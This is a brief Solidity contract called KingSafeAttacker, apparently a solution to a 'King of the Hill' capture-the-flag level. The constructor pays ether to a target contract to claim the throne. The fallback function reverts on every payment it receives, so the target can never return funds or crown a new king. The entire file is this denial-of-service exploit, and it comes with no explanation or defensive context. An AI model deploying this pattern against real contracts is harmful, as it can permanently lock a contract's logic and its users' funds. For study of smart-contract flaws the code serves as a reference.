// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingSafeAttacker {
    address payable target;

    constructor(address payable _kingContract) payable {
        target = _kingContract;
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    fallback() external payable {
        revert("This king cannot be dethroned");
    }
}